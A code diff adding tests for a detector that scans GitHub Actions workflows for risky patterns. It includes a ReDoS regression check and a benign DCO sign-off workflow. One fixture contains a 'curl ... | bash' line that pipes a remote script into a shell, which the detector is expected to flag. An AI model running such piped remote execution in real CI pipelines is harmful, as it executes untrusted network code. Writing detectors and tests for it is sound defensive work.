@@ -71,4 +71,64 @@ describe('GithubActionsSignals', () => {
     expect(signals[0].file).toBe(WF);
     expect(signals[0].language).toBe('github-actions');
   });
+  describe('multiline run blocks', () => {
+    it('detects a piped remote exec inside a "run: |" block', () => {
+      const content = [
+        'jobs:',
+        '  build:',
+        '    steps:',
+        '      - name: install',
+        '        run: |',
+        '          set -e',
+        '          echo hello',
+        '          curl -sL https://example.com/i.sh | bash',
+        '          echo done',
+      ].join('\n');
+      const signals = detector.detect(WF, content);
+      expect(signals.some(x => x.type === 'piped-remote-exec')).toBe(true);
+    });
+
+    it('completes quickly on a long run block with no piped exec (ReDoS regression)', () => {
+      // A single regex spanning the whole block backtracked exponentially here
+      // and hung the scan forever. Guard the linear behaviour with a clock.
+      const body = Array.from({ length: 40 }, (_, i) => `          echo step-${i}`).join('\n');
+      const content = `jobs:\n  b:\n    steps:\n      - run: |\n${body}\n`;
+      const started = Date.now();
+      const signals = detector.detect(WF, content);
+      const elapsed = Date.now() - started;
+      expect(signals.some(x => x.type === 'piped-remote-exec')).toBe(false);
+      expect(elapsed).toBeLessThan(1000);
+    });
+
+    it('scans this repository\'s own dco.yml without hanging', () => {
+      // The exact file that hung the dogfood CI job.
+      const content = [
+        'name: DCO',
+        'on:',
+        '  pull_request:',
+        '    types: [opened, synchronize, reopened]',
+        'jobs:',
+        '  check:',
+        '    steps:',
+        '      - name: Verify Signed-off-by on every commit',
+        '        run: |',
+        '          set -uo pipefail',
+        '          failed=0',
+        '          while IFS= read -r sha; do',
+        '            [ -n "$sha" ] || continue',
+        '            author="$(git show -s --format=%an "$sha")"',
+        '            if ! printf %s "$body" | grep -qiE "^Signed-off-by:"; then',
+        '              echo "FAIL"',
+        '              failed=1',
+        '            fi',
+        '          done < <(git rev-list --no-merges "$BASE..$HEAD")',
+        '          if [ "$failed" -ne 0 ]; then',
+        '            exit 1',
+        '          fi',
+      ].join('\n');
+      const started = Date.now();
+      detector.detect(WF, content);
+      expect(Date.now() - started).toBeLessThan(1000);
+    });
+  });
 });
